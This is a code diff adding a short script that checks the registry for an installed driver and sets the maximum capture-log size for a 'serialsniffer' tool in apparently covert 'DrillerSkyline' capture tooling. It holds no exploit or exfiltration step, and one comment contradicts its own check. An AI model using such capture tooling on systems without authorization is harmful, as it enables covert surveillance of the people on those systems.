@@ -1,0 +1,45 @@
+#--------------------------------------------------------
+# File: SetMaxFileSize.eps
+#
+# Sets the maximum capture file size for DrillerSkyline tools
+#
+# Modifications:
+#  12/12/2006	Stole from DS
+#--------------------------------------------------------
+
+@echo off;
+
+if ($argc != 2) {
+    echo "Usage: $argv[0] <driverName>";
+    return false;
+}
+
+string $driver = $argv[1];
+
+# make sure it's not already installed
+ifnot (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$driver`) {
+    echo "* $driver is not yet installed";
+    return false;
+}
+
+echo "";
+echo "Enter a size of zero for an unlimited capture file";
+echo "";
+
+int $size = GetInput("Enter the maximum capture file size (in bytes)");
+if ($size < 0) {
+    echo "Size must be greater than or equal to zero";
+    return false;
+}
+
+# add the registry keys
+
+echo "Settings maximum file size";
+if(`serialsniffer -driver $driver -setmaxlogsize $size`) {
+	echo "    SUCCESS";
+	return true;
+} else {
+	echo "    FAILED";
+	return false;
+}
+return true;
